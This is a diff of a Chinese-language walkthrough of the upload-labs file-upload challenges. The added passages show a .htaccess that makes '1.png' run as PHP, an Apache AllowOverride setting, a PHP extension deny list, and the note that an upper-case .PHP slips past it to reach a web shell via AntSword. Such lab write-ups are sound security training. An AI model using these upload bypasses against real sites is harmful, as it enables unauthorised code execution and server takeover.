@@ -50,7 +50,7 @@ burpsuite 在点击上传前中断抓包，修改 .png 为 .php 然后该 payloa
 http://192.168.122.16/upload/shell.php
 ```
 
-打开 AntSward 添加，密码就填 shell 就行，实际就是传参的变量。这样就远程控制了。  
+打开 AntSword 添加，密码就填 shell 就行，实际就是传参的变量。这样就远程控制了。  
 
 ### Pass-2
 查看源码：
@@ -157,3 +157,54 @@ if (isset($_POST['submit'])) {
 }
 ```
 
+所以要上传 `.htaccess` 配置文件来修改 Apache 服务器配置命令。   
+创建 `.htaccess` 写上：  
+```.htaccess
+<FilesMatch "1.png">
+SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+要修改 apache 配置文件：  
+``` conf
+<Directory />
+	Options FollowSymLinks
+	AllowOverride All
+	Require all granted
+</Directory>
+```
+
+这样把 1.png 直接按 php 文件执行，然后再把 php 文件修改为 1.png 就绕过检查，拿 AntSword 直接进 web shell。  
+这种方法在网页对上传文件重命名的时候无法使用。  
+
+### Pass-5
+``` php
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+```
+
+没改大小写，直接大写 PHP 直接过。  
